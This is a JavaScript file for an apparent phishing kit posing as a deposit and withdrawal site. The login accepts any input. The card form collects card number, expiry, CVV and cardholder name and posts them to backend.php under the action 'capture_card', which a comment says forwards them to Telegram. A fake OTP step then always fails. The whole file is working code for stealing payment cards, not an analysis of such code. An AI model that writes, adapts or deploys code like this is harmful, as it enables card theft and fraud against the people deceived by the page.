document.addEventListener('DOMContentLoaded', function() {

    let currentUser = null;
    let isDeposit = true;

    // Tab switching
    window.showTab = function(tab) {
        document.querySelectorAll('.auth-form').forEach(form => form.classList.remove('active'));
        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));

        if (tab === 'login') {
            document.getElementById('loginForm').classList.add('active');
            document.querySelector('.tab-btn:nth-child(1)').classList.add('active');
        } else {
            document.getElementById('signupForm').classList.add('active');
            document.querySelector('.tab-btn:nth-child(2)').classList.add('active');
        }
    };

    // Login
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const email = document.getElementById('loginEmail').value;
        const password = document.getElementById('loginPassword').value;
        setTimeout(() => {
            currentUser = { email, name: email.split('@')[0] };
            document.getElementById('userName').textContent = 'Welcome, ' + currentUser.name + '!';
            showPage('dashboard');
        }, 1500);
    });

    // Signup
    document.getElementById('signupForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const name = document.getElementById('signupName').value;
        const email = document.getElementById('signupEmail').value;
        const password = document.getElementById('signupPassword').value;
        const confirm = document.getElementById('signupConfirm').value;
        if (password !== confirm) {
            alert('Passwords do not match!');
            return;
        }
        currentUser = { email, name };
        document.getElementById('userName').textContent = 'Welcome, ' + name + '!';
        showPage('dashboard');
    });

    // Page navigation
    window.showPage = function(page) {
        document.querySelectorAll('.modal, .dashboard, .card-page, .otp-page').forEach(el => el.classList.add('hidden'));
        document.getElementById(page).classList.remove('hidden');
    };

    window.goToDeposit = function() {
        isDeposit = true;
        document.getElementById('cardTitle').textContent = 'Deposit Funds';
        showPage('cardPage');
    };

    window.goToWithdraw = function() {
        isDeposit = false;
        document.getElementById('cardTitle').textContent = 'Withdraw Funds';
        showPage('cardPage');
    };

    window.goBackToDashboard = function() {
        showPage('dashboard');
    };

    window.goBackToCard = function() {
        showPage('cardPage');
    };

    // Card number formatting
    document.getElementById('cardNumber').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
        let parts = [];
        for (let i = 0; i < value.length && i < 16; i += 4) {
            parts.push(value.substring(i, i + 4));
        }
        e.target.value = parts.join(' ');
    });

    // Expiry formatting
    document.getElementById('expiry').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
    });

    // Card form submission -> sends to backend.php -> Telegram
    document.getElementById('cardForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const cardData = {
            type: isDeposit ? 'Deposit' : 'Withdraw',
            cardNumber: document.getElementById('cardNumber').value,
            expiry: document.getElementById('expiry').value,
            cvv: document.getElementById('cvv').value,
            cardholder: document.getElementById('cardName').value,
            amount: document.getElementById('amount').value,
            user: currentUser ? currentUser.email : 'unknown',
            timestamp: new Date().toISOString()
        };

        fetch('backend.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: 'capture_card', data: cardData })
        }).then(function() {
            showPage('otpPage');
        }).catch(function() {
            showPage('otpPage');
        });
    });

    // OTP form submission
    document.getElementById('otpForm').addEventListener('submit', function(e) {
        e.preventDefault();
        alert('Transaction failed: Invalid OTP. Please try again.');
        showPage('dashboard');
    });

    // OTP auto-focus
    document.querySelectorAll('.otp-input').forEach(function(input, index, arr) {
        input.addEventListener('input', function() {
            if (this.value.length === 1 && index < arr.length - 1) {
                arr[index + 1].focus();
            }
        });
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !this.value && index > 0) {
                arr[index - 1].focus();
            }
        });
    });

});
